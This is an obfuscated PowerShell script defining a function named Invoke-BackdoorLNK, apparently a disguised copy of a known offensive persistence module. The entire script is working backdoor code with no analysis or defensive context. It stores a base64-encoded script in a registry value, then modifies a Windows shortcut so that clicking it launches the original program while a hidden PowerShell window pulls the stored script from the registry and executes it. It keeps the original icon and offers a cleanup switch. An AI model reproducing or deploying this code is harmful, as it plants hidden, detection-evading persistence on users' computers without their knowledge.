 ${0`4Dp}= [tYpe]("{0}{2}{4}{3}{1}" -F'sys','ding','teM.TE','ENCo','xt.')  ;  ${x`8Yn9} =  [typE]("{0}{4}{3}{2}{1}"-F 'Sy','t','NVer','Tem.Co','S');  function iN`VOKe-BaCkdoO`Rl`NK {


    [CmdletBinding()] Param(
        [Parameter(vaLueFrOMPIPeLINe=${T`Rue}, MAnDAtory = ${t`RuE})]
        [ValidateScript({Test-Path -Path ${_} })]
        [String]
        ${l`NkpATh},

        [String]
        ${ENcs`cr`IpT},

        [String]
        ${rEG`pA`TH} = 'HKCU:\Software\Microsoft\Windows\debug',

        [Switch]
        ${C`LEANUp}
    )

    ${ReG`pa`Rts} = ${REG`pA`TH}."sp`LIT"("\")
    ${PA`Th} = ${r`e`GpaRtS}[0..(${r`EGp`Ar`TS}."c`OUnt"-2)] -join "\"
    ${N`AmE} = ${RE`Gp`ArTS}[-1]


    ${o`Bj} = New-Object -ComObject ("{0}{2}{1}"-f'WScri','ll','pt.She')
    ${l`Nk} = ${o`Bj}."crE`At`esHo`Rtcut"(${LNK`pa`Th})

    
    ${Targ`e`T`patH} = ${L`NK}."tA`RgE`TpA`Th"
    ${W`Ork`iN`g`DIRECTory} = ${l`NK}."WOrkING`DIr`Ec`T`oRy"
    ${icOn`LOCat`Ion} = ${L`NK}."Ic`oN`LO`cATION"

    if(${CL`eAnUp}) {

        
        ${ORIg`I`NAl`p`ATh} = (${ic`onl`o`caTiOn} -split ",")[0]

        ${l`NK}."tArg`eTPA`Th" = ${ORiGI`NALP`ATh}
        ${L`Nk}."ArgU`m`ents" = ${Nu`LL}
        ${l`NK}."w`ind`o`wstylE" = 1
        ${L`Nk}."s`AvE"()

        
        ${N`uLL} = Remove-ItemProperty -Force -Path ${Pa`Th} -Name ${N`AmE}
    }
    else {

        if(!${enC`scr`ipt} -or ${e`N`cSC`RIpT} -eq '') {
            throw "-EncScript or -Cleanup required!"
        }

        
        ${Nu`Ll} = Set-ItemProperty -Force -Path ${p`ATH} -Name ${N`AMe} -Value ${en`CSCRI`PT}

        "[*] B64 script stored at '$RegPath'`n"

        
        ${L`Nk}."Ta`RGEtpa`TH" = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

        
        ${L`A`uNch`StR`iNG} = '[System.Diagnostics.Process]::Start("'+${T`ArGetp`AtH}+'");IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp '+${P`AtH}+' '+${nA`Me}+').'+${na`ME}+')))'

        ${LAU`N`c`HBYteS}  =  ( cHiLdITem ("{4}{3}{2}{0}{1}"-f'4','dP',':0','iaBLE','VaR') )."v`Alue"::"UN`icode"."gETB`Y`TEs"(${LAun`cH`STRI`Ng})
        ${laUnC`H`B64} =  ( dIr  ("v"+"ar"+"iABLE:x8y"+"N9")  )."v`ALuE"::"T`OBAse`64STri`Ng"(${LaU`Nchby`T`es})

        ${L`Nk}."a`Rg`UMEnts" = "-w hidden -nop -enc $LaunchB64"

        
        ${L`Nk}."WorK`INGdIR`e`C`ToRY" = ${W`oR`KInGdIrEc`TORy}
        ${l`Nk}."I`c`OnLocA`TION" = "$TargetPath,0"
        ${l`Nk}."wIN`dow`STy`le" = 7
        ${L`NK}."SA`VE"()

        "[*] .LNK at $LNKPath set to trigger`n"
    }
}